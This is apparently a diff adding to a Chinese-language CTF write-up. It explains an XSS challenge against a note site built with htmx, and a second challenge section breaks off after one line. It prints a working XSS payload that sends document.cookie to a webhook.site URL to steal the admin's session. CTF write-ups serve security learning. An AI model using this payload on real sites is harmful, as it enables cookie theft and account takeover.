@@ -37,6 +37,25 @@ fetch("/")
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018202947.png)
 直接访问即可得到flag
 
+### awesome I
+#xss 
+一个可以提交在线笔记的网页,需要xss到admin获取cookie来读取flag笔记
+
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018214928.png)
+可以观察到使用htmx,
+
+```html
+<div hx-get="https://webhook.site/cd508abb-abf4-42db-92d8-af41cf9017b3" hx-trigger="load" hx-target="this" hx-on="htmx:afterRequest:fetch('https://webhook.site/cd508abb-abf4-42db-92d8-af41cf9017b3?a='+document.cookie)">click</div>
+```
+
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018220811.png)
+获取到admincookie
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018221504.png)
+
+### awesomeII
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018222050.png)
+
+tags里是一堆数学公式标签,允许自定义style,
 # reverse
 
 # pwn
